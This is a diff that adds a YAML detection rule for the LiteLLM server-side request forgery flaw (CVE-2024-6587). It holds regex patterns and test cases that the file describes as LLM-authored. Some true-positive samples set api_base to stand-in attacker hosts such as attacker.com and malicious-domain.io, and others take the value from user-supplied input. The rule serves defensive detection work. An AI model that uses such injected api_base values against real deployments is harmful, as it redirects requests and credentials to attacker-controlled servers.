@@ -1,0 +1,113 @@
+title: LiteLLM Server-Side Request Forgery (SSRF) vulnerability
+id: ATR-2026-00556
+rule_version: 1
+status: experimental
+description: |
+  GitHub Security Advisory GHSA-g26j-5385-hhw3 (CVE-2024-6587). LiteLLM Server-Side Request Forgery (SSRF) vulnerability
+author: ATR Community (GHSA sync)
+date: 2026/05/30
+schema_version: '0.1'
+detection_tier: pattern
+maturity: experimental
+severity: critical
+references:
+  cve:
+    - CVE-2024-6587
+  cwe:
+    - CWE-918
+  ghsa:
+    - GHSA-g26j-5385-hhw3
+  external:
+    - https://nvd.nist.gov/vuln/detail/CVE-2024-6587
+    - https://github.com/berriai/litellm/commit/ba1912afd1b19e38d3704bb156adf887f91ae1e0
+    - https://huntr.com/bounties/4001e1a2-7b7a-4776-a3ae-e6692ec3d997
+    - https://github.com/advisories/GHSA-g26j-5385-hhw3
+metadata_provenance:
+  ghsa: ghsa-sync
+  cve: ghsa-sync
+  cwe: ghsa-sync
+tags:
+  category: tool-poisoning
+  scan_target: runtime
+  confidence: high
+agent_source:
+  type: llm_io
+  framework:
+    - any
+  provider:
+    - any
+detection:
+  condition: any
+  false_positives: []
+  conditions:
+    - field: content
+      operator: regex
+      value: >-
+        (?i)['"](?:api_base|base_url)['"]\s*[=:]\s*['"](?!https?://(?:localhost|127\.0\.0\.1|\[::\]|api\.openai\.com|api\.anthropic\.com|api\.cohere\.com|api\.together\.ai|api\.aleph\.alpha\.com))[^'"]+['"]
+      description: >-
+        Detects assignment of api_base or base_url parameters to potentially attacker-controlled domains (excluding
+        whitelisted provider domains)
+    - field: content
+      operator: regex
+      value: >-
+        (?i)request_body\[?['"](?:api_base|base_url)['"]?\]\s*=|{[^}]*['"](?:api_base|base_url)['"]\s*:\s*(?!https?://(?:localhost|127\.0\.0\.1|\[::\]|api\.openai\.com|api\.anthropic\.com|api\.cohere\.com|api\.together\.ai|api\.aleph\.alpha\.com))
+      description: Detects injection of api_base or base_url into request bodies or dictionaries with non-standard domains
+    - field: content
+      operator: regex
+      value: >-
+        (?i)(?:chat/completions|completions|embeddings|models).*['"](?:api_base|base_url)['"]\s*[=:]|(?:api_base|base_url).*(?:user_input|request\.json|json\.loads|body|payload)
+      description: Detects api_base/base_url parameter in LLM endpoint requests that derive from untrusted sources
+response:
+  actions:
+    - alert
+  notify:
+    - security_team
+test_cases:
+  true_positives:
+    - input: '{"model": "gpt-4", "api_base": "https://attacker.com/fake-openai", "messages": []}'
+      expected: triggered
+      description: LLM-authored attack sample 1
+    - input: request_body['base_url'] = user_supplied_domain
+      expected: triggered
+      description: LLM-authored attack sample 2
+    - input: api_base = request.json.get('api_base')
+      expected: triggered
+      description: LLM-authored attack sample 3
+    - input: '{"api_base": "http://malicious-domain.io", "model": "gpt-3.5-turbo"}'
+      expected: triggered
+      description: LLM-authored attack sample 4
+    - input: completion = litellm.completion(model='gpt-4', api_base=untrusted_url, messages=msgs)
+      expected: triggered
+      description: LLM-authored attack sample 5
+  true_negatives:
+    - input: |-
+        import requests
+        resp = requests.get(url, timeout=10)
+        resp.raise_for_status()
+      expected: not_triggered
+      description: LLM-authored benign sample 1
+    - input: |-
+        from langchain.chains import LLMChain
+        chain = LLMChain(llm=llm, prompt=prompt)
+      expected: not_triggered
+      description: LLM-authored benign sample 2
+    - input: base_url = 'https://api.openai.com/v1'
+      expected: not_triggered
+      description: LLM-authored benign sample 3
+    - input: api_base = os.environ.get('OPENAI_API_BASE', 'https://api.openai.com/v1')
+      expected: not_triggered
+      description: LLM-authored benign sample 4
+    - input: 'config = {''model'': ''gpt-4'', ''timeout'': 30}'
+      expected: not_triggered
+      description: LLM-authored benign sample 5
+_llm_authored:
+  model: claude-haiku-4-5-20251001
+  generalization_note: >-
+    Rule detects the core attack pattern: user-controlled api_base/base_url parameters being set to attacker-controlled
+    domains in LLM requests. It generalizes beyond the literal PoC by (1) matching both api_base and base_url variants,
+    (2) detecting the parameter in multiple contexts (dict assignment, request body, function calls), (3) whitelisting
+    legitimate provider domains to avoid FP on legitimate config, and (4) matching untrusted sources (user_input,
+    request bodies, user-supplied variables) rather than hardcoded domains.
+  note: >-
+    Generation-time LLM authoring; verified by deterministic gate. Runtime detection is pure regex. Human review
+    required before merge.
